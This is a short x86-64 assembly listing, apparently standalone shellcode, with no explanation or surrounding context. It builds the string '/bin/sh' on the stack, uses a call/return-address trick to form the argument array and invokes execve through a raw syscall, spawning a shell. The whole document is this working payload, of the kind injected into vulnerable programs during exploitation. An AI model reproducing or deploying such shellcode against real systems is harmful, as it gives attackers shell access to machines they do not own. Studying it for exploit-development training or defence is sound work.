	.text
.globl _start

_start:
	movq $0x68732f6e69622f, %rbx
	pushq %rbx
	movq %rsp, %rdi
	xorq %rdx, %rdx
	pushq %rdx
	callq sstart

sh:	.asciz "/bin/sh"

sstart: movq %rsp, %rsi
	pushq $0x3b
	popq %rax
	syscall
